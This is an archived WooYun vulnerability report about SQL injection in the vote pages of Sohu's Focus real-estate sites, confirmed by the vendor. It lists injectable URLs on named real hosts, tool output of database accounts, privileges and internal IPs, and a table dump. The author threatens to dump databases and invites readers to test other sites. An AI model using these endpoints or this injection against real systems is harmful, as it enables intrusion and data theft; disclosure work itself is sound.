@@ -1,0 +1,709 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐某应用某功能存在SQL注入，通杀全国站点  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐某应用某功能存在SQL注入，通杀全国站点  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/se55i0n">se55i0n</a> 
+</li><li>提交时间：		2013-03-27 10:22</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-16：	细节向普通白帽子公开<br/>
+									2013-04-26：	细节向实习白帽子公开<br/>
+									2013-05-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">看了道哥的黑板报，我觉得我没接触过安全，因为我没有一个裤子！<br />
+搜狐，如果你们觉得漏洞不重要可以继续忽略，哥就把该应用全国的裤子都收了！剑心，你收裤子不？</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">存在问题的应用为搜狐的焦点房产网，全国所有焦点房产网的vote功能都存在注入！<br />
+<br />
+<br />
+<br />
+1）仅仅举一个例子，测试站点：http://ts.focus.cn/vote/developer_intro.php?ID=90<br />
+<br />
+</p><p class="detail"><a href="../images/261912054ea91ea8b3ea5cfb892d54f347671d23.png" target="_blank"><img src="../images/261912054ea91ea8b3ea5cfb892d54f347671d23.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2）测试下数据库用户什么权限，自己看吧；<br />
+<br />
+</p><pre><code>[*] &#039;fdbuser&#039;@&#039;10.10.90.%&#039; [19]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EXECUTE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW VIEW<br />
+    privilege: UPDATE<br />
+[*] &#039;fdbuser&#039;@&#039;10.11.160.%&#039; [19]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EXECUTE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW VIEW<br />
+    privilege: UPDATE<br />
+[*] &#039;fdbuser&#039;@&#039;10.11.24.%&#039; [19]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EXECUTE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW VIEW<br />
+    privilege: UPDATE<br />
+[*] &#039;fdbuser&#039;@&#039;192.168.242.%&#039; [19]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EXECUTE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW VIEW<br />
+    privilege: UPDATE<br />
+[*] &#039;fdbuser&#039;@&#039;localhost&#039; [19]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EXECUTE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW VIEW<br />
+    privilege: UPDATE<br />
+[*] &#039;mysqlmon&#039;@&#039;192.168.242.180&#039; (administrator) [26]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EVENT<br />
+    privilege: EXECUTE<br />
+    privilege: FILE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: RELOAD<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW DATABASES<br />
+    privilege: SHOW VIEW<br />
+    privilege: SHUTDOWN<br />
+    privilege: SUPER<br />
+    privilege: TRIGGER<br />
+    privilege: UPDATE<br />
+[*] &#039;pingmysql&#039;@&#039;10.10.58.195&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;pingmysql&#039;@&#039;10.11.36.20&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;pingmysql&#039;@&#039;10.11.36.22&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;pingmysql&#039;@&#039;192.168.1.128&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;pingmysql&#039;@&#039;192.168.1.139&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;pingmysql&#039;@&#039;192.168.1.178&#039; [1]:<br />
+    privilege: USAGE<br />
+[*] &#039;readonly&#039;@&#039;%&#039; [2]:<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: SELECT<br />
+[*] &#039;repadm&#039;@&#039;192.168.242.%&#039; [1]:<br />
+    privilege: REPLICATION SLAVE<br />
+[*] &#039;repadm&#039;@&#039;192.168.242.87&#039; [1]:<br />
+    privilege: REPLICATION SLAVE<br />
+[*] &#039;repladmin&#039;@&#039;10.10.90.%&#039; (administrator) [27]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE USER<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EVENT<br />
+    privilege: EXECUTE<br />
+    privilege: FILE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: RELOAD<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW DATABASES<br />
+    privilege: SHOW VIEW<br />
+    privilege: SHUTDOWN<br />
+    privilege: SUPER<br />
+    privilege: TRIGGER<br />
+    privilege: UPDATE<br />
+[*] &#039;repladmin&#039;@&#039;192.168.242.%&#039; [1]:<br />
+    privilege: REPLICATION SLAVE<br />
+[*] &#039;root&#039;@&#039;127.0.0.1&#039; (administrator) [27]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE USER<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EVENT<br />
+    privilege: EXECUTE<br />
+    privilege: FILE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: RELOAD<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW DATABASES<br />
+    privilege: SHOW VIEW<br />
+    privilege: SHUTDOWN<br />
+    privilege: SUPER<br />
+    privilege: TRIGGER<br />
+    privilege: UPDATE<br />
+[*] &#039;root&#039;@&#039;localhost&#039; (administrator) [27]:<br />
+    privilege: ALTER<br />
+    privilege: ALTER ROUTINE<br />
+    privilege: CREATE<br />
+    privilege: CREATE ROUTINE<br />
+    privilege: CREATE TEMPORARY TABLES<br />
+    privilege: CREATE USER<br />
+    privilege: CREATE VIEW<br />
+    privilege: DELETE<br />
+    privilege: DROP<br />
+    privilege: EVENT<br />
+    privilege: EXECUTE<br />
+    privilege: FILE<br />
+    privilege: INDEX<br />
+    privilege: INSERT<br />
+    privilege: LOCK TABLES<br />
+    privilege: PROCESS<br />
+    privilege: REFERENCES<br />
+    privilege: RELOAD<br />
+    privilege: REPLICATION CLIENT<br />
+    privilege: REPLICATION SLAVE<br />
+    privilege: SELECT<br />
+    privilege: SHOW DATABASES<br />
+    privilege: SHOW VIEW<br />
+    privilege: SHUTDOWN<br />
+    privilege: SUPER<br />
+    privilege: TRIGGER<br />
+    privilege: UPDATE</code></pre><p class='detail'><br />
+<br />
+3）站点数据库；<br />
+<br />
+</p><p class="detail"><a href="../images/26191452fe00875b351bbdc5a6656bc281fd2fc9.png" target="_blank"><img src="../images/26191452fe00875b351bbdc5a6656bc281fd2fc9.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4）随便找个库跑下表；<br />
+<br />
+</p><pre><code>Database: tshouse<br />
+[268 tables]<br />
++-------------------------+<br />
+| ad_order                |<br />
+| ad_page                 |<br />
+| ad_position             |<br />
+| ad_sort                 |<br />
+| ad_style                |<br />
+| ad_word                 |<br />
+| add_boss_log            |<br />
+| admin_fakename          |<br />
+| against_agent           |<br />
+| agent                   |<br />
+| album_class             |<br />
+| album_photo_count       |<br />
+| art_sh_htopic           |<br />
+| article_admin           |<br />
+| article_class           |<br />
+| article_vote            |<br />
+| bbs_style               |<br />
+| bj_mem_group_marks      |<br />
+| bookmarks_category      |<br />
+| bz_apply                |<br />
+| click                   |<br />
+| clock                   |<br />
+| cp_msg                  |<br />
+| day_posts               |<br />
+| db_query_cache          |<br />
+| del_index               |<br />
+| deny_msg                |<br />
+| deny_photo              |<br />
+| diary_html_head_config  |<br />
+| diary_resident_config   |<br />
+| dmc_account             |<br />
+| dmc_around              |<br />
+| dmc_askuser             |<br />
+| dmc_board_account       |<br />
+| dmc_board_msg           |<br />
+| dmc_construct_type_dict |<br />
+| dmc_deputy              |<br />
+| dmc_dict_power          |<br />
+| dmc_dict_structure      |<br />
+| dmc_direction_dict      |<br />
+| dmc_dpxl                |<br />
+| dmc_facilities          |<br />
+| dmc_favorite            |<br />
+| dmc_gov_locate          |<br />
+| dmc_house               |<br />
+| dmc_investor            |<br />
+| dmc_keywords            |<br />
+| dmc_kfs                 |<br />
+| dmc_link                |<br />
+| dmc_loopline_dict       |<br />
+| dmc_message             |<br />
+| dmc_message_class       |<br />
+| dmc_movement_info       |<br />
+| dmc_movement_info_bak   |<br />
+| dmc_movement_info_page  |<br />
+| dmc_movement_info_proj  |<br />
+| dmc_news_keywords       |<br />
+| dmc_noun                |<br />
+| dmc_price_incre         |<br />
+| dmc_proj                |<br />
+| dmc_proj_correct        |<br />
+| dmc_proj_del            |<br />
+| dmc_proj_effectphoto    |<br />
+| dmc_proj_link           |<br />
+| dmc_proj_maillist       |<br />
+| dmc_proj_mobilelist     |<br />
+| dmc_proj_photo          |<br />
+| dmc_proj_price_list     |<br />
+| dmc_proj_sale_list      |<br />
+| dmc_proj_tag            |<br />
+| dmc_proj_tuangou        |<br />
+| dmc_proj_type_dict      |<br />
+| dmc_register            |<br />
+| dmc_related_proj        |<br />
+| dmc_resident_dict       |<br />
+| dmc_sale_time           |<br />
+| dmc_search_house        |<br />
+| dmc_set                 |<br />
+| dmc_showpiece           |<br />
+| dmc_subject             |<br />
+| dmc_subject_item        |<br />
+| dmc_team                |<br />
+| dmc_team_sub            |<br />
+| dmc_tongzhi             |<br />
+| dmc_txt_top             |<br />
+| dmc_type                |<br />
+| dmc_type_class          |<br />
+| dmc_type_comment        |<br />
+| dmc_user                |<br />
+| dmc_zhoubian            |<br />
+| elite_account           |<br />
+| elite_article           |<br />
+| elite_class             |<br />
+| elite_intro             |<br />
+| elite_pic               |<br />
+| eml_templet             |<br />
+| eml_templet_imgmod      |<br />
+| eml_templet_mod         |<br />
+| emml_email_template     |<br />
+| emml_focus_mail         |<br />
+| emml_list               |<br />
+| emml_login_session      |<br />
+| emml_mail_subscribe     |<br />
+| emml_maillist           |<br />
+| emml_options            |<br />
+| emml_sendmail           |<br />
+| emml_subscriber         |<br />
+| emml_subscriber_del     |<br />
+| eye_hot                 |<br />
+| files_category          |<br />
+| focus_gift              |<br />
+| focus_msg               |<br />
+| focustalk_a             |<br />
+| focustalk_jb            |<br />
+| focustalk_q             |<br />
+| focustalk_q_a           |<br />
+| focustalk_suji          |<br />
+| forum_elite_detail      |<br />
+| forum_elite_tag         |<br />
+| forum_favourite         |<br />
+| forum_focus_detail      |<br />
+| forum_news_sort         |<br />
+| gather                  |<br />
+| gather_bak              |<br />
+| gift_change             |<br />
+| graph_news              |<br />
+| graph_news_hot          |<br />
+| graph_news_hot_seed     |<br />
+| group_around            |<br />
+| group_article           |<br />
+| group_article_del       |<br />
+| group_focus             |<br />
+| group_forum_tongji      |<br />
+| group_help_phone        |<br />
+| group_info              |<br />
+| group_member            |<br />
+| group_member_sort       |<br />
+| group_member_week_sort  |<br />
+| groupweeksort           |<br />
+| groupweeksort_temp      |<br />
+| hide_msg                |<br />
+| hot_news_ad             |<br />
+| house_album_focus       |<br />
+| house_album_info        |<br />
+| house_bookmarks         |<br />
+| house_click             |<br />
+| house_click_7           |<br />
+| house_count             |<br />
+| house_day_update        |<br />
+| house_files             |<br />
+| house_forum             |<br />
+| house_forum_admin       |<br />
+| house_forum_del         |<br />
+| house_forum_delbak      |<br />
+| house_forum_edit        |<br />
+| house_forum_elite       |<br />
+| house_forum_newmsg      |<br />
+| house_forum_tags        |<br />
+| house_forum_top         |<br />
+| house_forum_warn        |<br />
+| house_group             |<br />
+| house_group_detail      |<br />
+| house_group_pic         |<br />
+| house_menu              |<br />
+| house_msg_tags          |<br />
+| house_photos            |<br />
+| house_photos_class      |<br />
+| house_photos_commend    |<br />
+| house_photos_count      |<br />
+| house_photos_del        |<br />
+| house_photos_focus      |<br />
+| house_photos_nearby     |<br />
+| house_sub_forum         |<br />
+| houseztmaker            |<br />
+| hv_base_new             |<br />
+| info                    |<br />
+| linkman                 |<br />
+| lock_msg                |<br />
+| materials               |<br />
+| materials_brand         |<br />
+| materials_brand_class   |<br />
+| materials_click_7       |<br />
+| materials_click_log     |<br />
+| materials_commend       |<br />
+| materials_owner         |<br />
+| materials_photo         |<br />
+| mem_half_marks          |<br />
+| memberweeksort          |<br />
+| memberweeksort_temp     |<br />
+| modmsg                  |<br />
+| modmsg_time             |<br />
+| msg_click_temp          |<br />
+| msg_count               |<br />
+| msg_count_del           |<br />
+| msg_count_sort          |<br />
+| msg_count_temp          |<br />
+| msg_stat                |<br />
+| msg_stat_week           |<br />
+| msg_view_log            |<br />
+| note                    |<br />
+| note_content            |<br />
+| note_del                |<br />
+| note_info               |<br />
+| note_type_relation      |<br />
+| online_user             |<br />
+| page                    |<br />
+| permit_member           |<br />
+| personl_order           |<br />
+| photo_click_temp        |<br />
+| photos_album            |<br />
+| photos_album_del        |<br />
+| photos_album_extend     |<br />
+| photos_album_vote       |<br />
+| photos_class            |<br />
+| photos_vote             |<br />
+| photos_vote_count       |<br />
+| pollresult              |<br />
+| polls                   |<br />
+| prep_subj               |<br />
+| prep_subj_cite          |<br />
+| prep_subj_class         |<br />
+| prep_subj_item          |<br />
+| project_users           |<br />
+| py_zdwc                 |<br />
+| register_20050425       |<br />
+| review_renke            |<br />
+| review_type             |<br />
+| review_user_sort        |<br />
+| reviewhouse             |<br />
+| reviewhouse_assess      |<br />
+| reviewhouse_grade       |<br />
+| room_type               |<br />
+| sales                   |<br />
+| sales_log               |<br />
+| sales_order             |<br />
+| sales_proj              |<br />
+| secret_forum_key        |<br />
+| secret_forum_key_log    |<br />
+| seven_group_marks_view  |<br />
+| sub_group_forum         |<br />
+| tbl_bbsadmin_apply      |<br />
+| tbl_news_media          |<br />
+| tbl_news_sycount        |<br />
+| tbl_news_syztcount      |<br />
+| tbl_news_top            |<br />
+| tbl_recommend_forum     |<br />
+| tbl_recommend_user      |<br />
+| tejiafang               |<br />
+| v2012_hot_posts         |<br />
+| vote                    |<br />
+| wap_pic_dev             |<br />
+| wap_picture_class       |<br />
+| warn_wordsdetail        |<br />
+| yaohao_data1            |<br />
+| yaohao_data2            |<br />
+| yaohao_data3            |<br />
+| yaohao_data4            |<br />
+| yaohao_list             |<br />
+| yaohao_open1            |<br />
+| yaohao_open2            |<br />
+| yaohao_open3            |<br />
+| yaohao_open4            |<br />
+| yaohao_sort1            |<br />
+| yaohao_sort2            |<br />
+| yaohao_sort3            |<br />
+| yaohao_sort4            |<br />
+| yaohao_target3          |<br />
+| yaohao_target4          |<br />
++-------------------------+</code></pre><p class='detail'><br />
+<br />
+5）哥又检测了一些站点，肯定全国各地的焦点房产网都存在同样的问题；<br />
+<br />
+</p><pre><code>http://sz.focus.cn/vote/developer_intro.php?ID=236<br />
+http://cs.focus.cn/vote/developer_intro.php?ID=746<br />
+http://house.focus.cn/vote/developer_intro.php?ID=2093<br />
+http://bd.focus.cn/vote/developer_intro.php?ID=59<br />
+http://cq.focus.cn/vote/developer_intro.php?ID=1548<br />
+http://tj.focus.cn/vote/developer_intro.php?ID=827 <br />
+http://zz.focus.cn/vote/developer_intro.php?ID=547<br />
+http://nc.focus.cn/vote/developer_intro.php?ID=17<br />
+http://huizhou.focus.cn/vote/developer_intro.php?ID=1859<br />
+http://km.focus.cn/vote/developer_intro.php?ID=768<br />
+http://xa.focus.cn/vote/developer_intro.php?ID=1494 <br />
+http://jn.focus.cn/vote/developer_intro.php?ID=150029<br />
+http://hrb.focus.cn/vote/developer_intro.php?ID=55<br />
+http://dl.focus.cn/vote/developer_intro.php?ID=797<br />
+http://cd.focus.cn/vote/developer_intro.php?ID=111835<br />
+http://hz.focus.cn/vote/developer_intro.php?ID=687<br />
+http://yc.focus.cn/vote/developer_intro.php?ID=86</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+PS：剩下的你们自己去测试吧! </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明~ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/se55i0n" title="se55i0n">se55i0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020720" title="搜狐某应用某功能存在SQL注入，通杀全国站点">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-03-27 10:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20720";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
